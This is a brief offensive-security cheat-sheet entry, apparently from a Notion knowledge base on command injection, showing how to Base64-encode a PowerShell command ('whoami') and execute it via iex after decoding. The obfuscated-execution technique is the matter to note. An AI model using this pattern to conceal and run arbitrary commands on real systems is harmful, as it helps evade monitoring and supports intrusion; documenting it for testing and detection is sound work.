# Execute Base64 Encoded Command Example

OS: Windows
Description: Execute Base64 Encoded Command
Security Domains: Command Injection (https://www.notion.so/Command-Injection-1434c8e52376803c8c3edfbca59dcd49?pvs=21)
Target_Technology: PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21)

### Convert to Base64

```jsx
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
```

Execute Command

```jsx
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```